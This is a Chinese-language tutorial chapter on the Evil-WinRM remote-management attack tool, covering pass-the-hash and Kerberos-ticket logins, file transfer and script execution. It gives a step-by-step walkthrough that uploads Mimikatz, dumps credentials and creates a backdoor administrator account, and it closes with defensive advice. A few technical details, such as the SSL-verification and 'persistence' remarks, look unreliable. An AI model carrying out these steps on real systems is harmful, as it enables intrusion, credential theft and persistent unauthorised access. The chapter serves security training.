# 第二十四章：Evil-WinRM - Windows远程管理攻击工具

## 24.1 Evil-WinRM 简介

### 什么是 Evil-WinRM？

想象一下，你是一名间谍，想要潜入敌方的办公室。正常情况下，你需要通过正门进入，出示证件，经过层层检查。但如果你知道后门的密码，就可以直接从后门进入，省去所有麻烦。

**Evil-WinRM**就是这样一个"后门钥匙"——它利用Windows的WinRM（Windows Remote Management）服务，让你可以远程连接到Windows主机，执行命令，上传下载文件，就像在本地操作一样。

简单来说，Evil-WinRM是一个**WinRM攻击工具**，可以帮助你：
- 通过密码、哈希或票据远程连接Windows主机
- 执行任意命令
- 上传和下载文件
- 绕过安全限制

### WinRM是什么？

WinRM是Windows自带的远程管理服务，类似于Linux的SSH。它允许管理员远程管理Windows主机，执行命令、配置系统等。

但就像任何强大的工具一样，WinRM如果配置不当，就会成为攻击者的入口。

### Evil-WinRM 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| 密码连接 | 使用明文密码远程连接 | 用钥匙开门 |
| 哈希连接 | 使用NTLM哈希远程连接（Pass-the-Hash） | 用钥匙复印件开门 |
| 票据连接 | 使用Kerberos票据连接（Pass-the-Ticket） | 用通行证进门 |
| 命令执行 | 执行CMD和PowerShell命令 | 在对方电脑上操作 |
| 文件上传 | 上传文件到目标主机 | 偷偷带东西进去 |
| 文件下载 | 下载文件到本地 | 偷取文件出来 |
| 脚本执行 | 执行PowerShell脚本 | 运行预设的操作 |

### 为什么Evil-WinRM如此强大？

Evil-WinRM之所以强大，是因为它：

1. **原生支持**：WinRM是Windows自带的服务，不需要额外安装
2. **多种认证方式**：支持密码、哈希、票据等多种认证方式
3. **绕过检测**：使用合法的WinRM协议，不容易被检测
4. **功能丰富**：集成了文件操作、脚本执行等功能
5. **跨平台**：可以在Linux、Windows、macOS上使用

---

## 24.2 安装教程

### 系统环境要求

Evil-WinRM是一个Ruby脚本，需要Ruby环境：
- Ruby 2.3+
- 支持Linux、Windows、macOS

### 安装Ruby

**Ubuntu/Kali Linux**

```bash
sudo apt update
sudo apt install ruby ruby-dev build-essential
```

**Windows**

1. 下载Ruby Installer：https://rubyinstaller.org/
2. 运行安装程序
3. 勾选"Add Ruby executables to your PATH"

**macOS**

```bash
# 使用Homebrew安装
brew install ruby
```

### 安装Evil-WinRM

**方法一：使用gem安装（推荐）**

```bash
gem install evil-winrm
```

**方法二：从GitHub克隆**

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
```

### 验证安装

```bash
evil-winrm -h
```

如果显示帮助信息，说明安装成功。

---

## 24.3 基础连接详解

### 密码连接

这是最基础的连接方式，使用用户名和密码：

```bash
evil-winrm -i 192.168.1.100 -u admin -p password
```

| 参数 | 说明 |
|------|------|
| -i | 目标IP地址 |
| -u | 用户名 |
| -p | 密码 |

### 哈希连接（Pass-the-Hash）

如果你只有NTLM哈希，没有明文密码，可以使用哈希连接：

```bash
evil-winrm -i 192.168.1.100 -u admin -H a1b2c3d4e5f6000000000000a1b2c3d4
```

| 参数 | 说明 |
|------|------|
| -H | NTLM哈希（格式：LM:NTLM，LM可以省略） |

**哈希格式说明**：

NTLM哈希有两种格式：
- **完整格式**：`LM哈希:NTLM哈希`，如 `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`
- **简化格式**：只需要NTLM哈希，如 `8846f7eaee8fb117ad06bdd830b7586c`

### 票据连接（Pass-the-Ticket）

如果你有Kerberos票据，可以使用票据连接：

```bash
# 设置KRB5CCNAME环境变量
export KRB5CCNAME=/path/to/ticket.ccache

# 使用票据连接
evil-winrm -i 192.168.1.100 -u admin -k
```

| 参数 | 说明 |
|------|------|
| -k | 使用Kerberos票据认证 |

### 连接到特定端口

WinRM默认使用5985端口（HTTP）或5986端口（HTTPS）：

```bash
# 连接到HTTP端口
evil-winrm -i 192.168.1.100 -u admin -p password -P 5985

# 连接到HTTPS端口
evil-winrm -i 192.168.1.100 -u admin -p password -S -P 5986
```

| 参数 | 说明 |
|------|------|
| -P | 指定端口 |
| -S | 使用SSL连接 |

---

## 24.4 常用命令详解

### 命令行参数

| 参数 | 说明 | 示例 |
|------|------|------|
| -i, --ip | 目标IP地址 | `-i 192.168.1.100` |
| -u, --user | 用户名 | `-u admin` |
| -p, --password | 密码 | `-p password` |
| -H, --hash | NTLM哈希 | `-H a1b2c3d4...` |
| -k, --kerberos | 使用Kerberos | `-k` |
| -S, --ssl | 使用SSL连接 | `-S` |
| -P, --port | 指定端口 | `-P 5985` |
| -c, --command | 执行单个命令 | `-c "whoami"` |
| -s, --scripts | 指定脚本目录 | `-s /path/to/scripts` |
| -e, --executables | 指定可执行文件目录 | `-e /path/to/exes` |
| -r, --read-timeout | 读取超时时间 | `-r 30` |
| -t, --transport | 传输类型 | `-t basic` |

### 交互式命令

连接成功后，你会进入交互式Shell，可以执行以下命令：

| 命令 | 说明 | 示例 |
|------|------|------|
| help | 显示帮助信息 | `help` |
| upload | 上传文件 | `upload local.txt C:\temp\local.txt` |
| download | 下载文件 | `download C:\temp\remote.txt local.txt` |
| powershell | 执行PowerShell命令 | `powershell Get-Process` |
| cmd | 执行CMD命令 | `cmd ipconfig` |
| exit | 退出连接 | `exit` |

---

## 24.5 文件操作详解

### 上传文件

```
upload /path/to/local/file C:\destination\file
```

**示例**：

```
upload mimikatz.exe C:\temp\mimikatz.exe
```

### 下载文件

```
download C:\source\file /path/to/local/file
```

**示例**：

```
download C:\Users\Administrator\Desktop\secret.txt secret.txt
```

### 批量上传

如果需要上传多个文件，可以使用通配符：

```
upload /path/to/tools/* C:\temp\tools\
```

### 文件传输注意事项

1. **路径格式**：目标路径使用Windows格式（`C:\temp\file.txt`）
2. **权限问题**：确保目标目录有写入权限
3. **文件大小**：大文件传输可能需要较长时间
4. **防火墙**：确保WinRM端口（5985/5986）没有被防火墙阻止

---

## 24.6 脚本执行详解

### 执行单行命令

```bash
evil-winrm -i 192.168.1.100 -u admin -p password -c "whoami"
```

### 执行PowerShell脚本

```bash
# 创建脚本文件
cat > script.ps1 << EOF
Get-Process
Get-Service
EOF

# 执行脚本
evil-winrm -i 192.168.1.100 -u admin -p password -c "powershell -ExecutionPolicy Bypass -File script.ps1"
```

### 使用内置脚本

Evil-WinRM内置了一些常用脚本：

```bash
# 指定脚本目录
evil-winrm -i 192.168.1.100 -u admin -p password -s /opt/evil-winrm/scripts

# 在交互式Shell中执行脚本
IEX (Get-Content script.ps1 -Raw)
```

### 常用内置脚本

| 脚本名称 | 说明 | 用途 |
|----------|------|------|
| Invoke-Mimikatz.ps1 | Mimikatz的PowerShell版本 | 提取凭证 |
| Invoke-PowerShellTcp.ps1 | 反向Shell | 获取交互式Shell |
| Invoke-PsExec.ps1 | PsExec功能 | 远程执行命令 |
| Get-NetUser.ps1 | 获取用户信息 | 信息收集 |
| Get-NetGroup.ps1 | 获取组信息 | 信息收集 |

---

## 24.7 高级功能详解

### 会话持久化

如果你需要保持会话，可以使用后台模式：

```bash
# 在后台运行
evil-winrm -i 192.168.1.100 -u admin -p password &

# 查看后台进程
jobs

# 切换到后台会话
fg %1
```

### 代理支持

如果需要通过代理连接目标：

```bash
# 设置代理环境变量
export HTTP_PROXY=http://proxy:8080
export HTTPS_PROXY=http://proxy:8080

# 连接目标
evil-winrm -i 192.168.1.100 -u admin -p password
```

### 证书验证

如果你有目标服务器的证书，可以禁用SSL验证：

```bash
evil-winrm -i 192.168.1.100 -u admin -p password -S -P 5986 --no-ssl-verify
```

### 编码支持

Evil-WinRM支持多种编码方式，可以绕过某些检测：

```bash
# 使用Base64编码执行命令
evil-winrm -i 192.168.1.100 -u admin -p password -c "powershell -EncodedCommand SGVsbG8gV29ybGQh"
```

---

## 24.8 实战案例：远程渗透Windows主机

### 场景说明

假设你已经获取了一个Windows主机的管理员凭证（用户名和哈希），现在需要远程连接该主机并获取敏感信息。

### 步骤

**步骤1：确认目标主机开启了WinRM**

```bash
# 使用nmap扫描WinRM端口
nmap -p 5985,5986 192.168.1.100

# 使用crackmapexec探测WinRM
crackmapexec winrm 192.168.1.100
```

**步骤2：使用哈希连接目标**

```bash
evil-winrm -i 192.168.1.100 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

**步骤3：执行基础命令**

```
# 查看当前用户
whoami

# 查看系统信息
systeminfo

# 查看网络配置
ipconfig /all

# 查看用户列表
net user
```

**步骤4：上传Mimikatz**

```
upload mimikatz.exe C:\temp\mimikatz.exe
```

**步骤5：提取凭证**

```
# 进入Mimikatz目录
cd C:\temp

# 运行Mimikatz
.\mimikatz.exe

# 提取密码
sekurlsa::logonpasswords
```

**步骤6：下载敏感文件**

```
download C:\Users\Administrator\Desktop\passwords.txt passwords.txt
```

**步骤7：建立持久化**

```
# 创建后门用户
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add

# 设置远程桌面
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

---

## 24.9 防御方法

### 禁用或限制WinRM

1. **禁用WinRM**：如果不需要远程管理，直接禁用WinRM服务
2. **限制访问**：只允许特定IP地址访问WinRM
3. **使用HTTPS**：强制使用SSL连接（端口5986）

### 强化认证

1. **禁用基本认证**：使用更安全的认证方式
2. **启用多因素认证**：增加认证难度
3. **限制管理员权限**：避免过度授权

### 监控日志

1. **启用WinRM日志**：记录所有WinRM连接和操作
2. **监控异常连接**：检测来自非信任IP的连接
3. **告警策略**：设置连接失败次数阈值，超过后告警

### 安全配置

1. **更新系统补丁**：及时修复WinRM相关漏洞
2. **防火墙规则**：限制WinRM端口的访问
3. **强密码策略**：使用复杂密码，防止被暴力破解

---

## 24.10 常见问题与解决方案

### 问题1：连接被拒绝

**现象**：连接时显示"Connection refused"

**原因**：WinRM服务未开启、端口被防火墙阻止、网络不可达

**解决方案**：
- 检查目标主机的WinRM服务状态
- 检查防火墙规则
- 确认网络连通性

### 问题2：认证失败

**现象**：连接时显示"Authentication failed"

**原因**：用户名错误、密码错误、哈希格式错误、权限不足

**解决方案**：
- 确认用户名和密码正确
- 检查哈希格式（LM:NTLM或纯NTLM）
- 确认用户具有WinRM访问权限

### 问题3：文件上传失败

**现象**：上传文件时显示错误

**原因**：目标路径不存在、权限不足、文件太大

**解决方案**：
- 确认目标路径存在
- 确认用户有写入权限
- 分块上传大文件

### 问题4：命令执行超时

**现象**：执行命令后长时间无响应

**原因**：网络延迟、命令执行时间过长、目标主机负载过高

**解决方案**：
- 增加超时时间（`-r 60`）
- 简化命令
- 等待目标主机负载降低

### 问题5：SSL连接失败

**现象**：使用SSL连接时显示证书错误

**原因**：证书过期、证书不匹配、SSL验证失败

**解决方案**：
- 使用`--no-ssl-verify`跳过验证
- 确认证书配置正确
- 使用HTTP端口（5985）作为替代

---

## 总结

本章详细介绍了Evil-WinRM的使用：

1. **什么是Evil-WinRM**：WinRM攻击工具，支持多种认证方式
2. **安装配置**：Ruby环境和Evil-WinRM的安装
3. **基础连接**：密码连接、哈希连接、票据连接
4. **常用命令**：命令行参数和交互式命令
5. **文件操作**：上传和下载文件
6. **脚本执行**：执行PowerShell脚本和内置脚本
7. **高级功能**：会话持久化、代理支持、证书验证、编码支持
8. **实战案例**：从连接目标到获取敏感信息的完整流程
9. **防御方法**：禁用WinRM、强化认证、监控日志、安全配置
10. **常见问题**：连接拒绝、认证失败、文件上传失败、命令超时、SSL连接失败的解决方案

Evil-WinRM是Windows远程攻击的重要工具，掌握它可以大大提高内网渗透的效率。

下一章我们将学习CrackMapExec——内网渗透的瑞士军刀！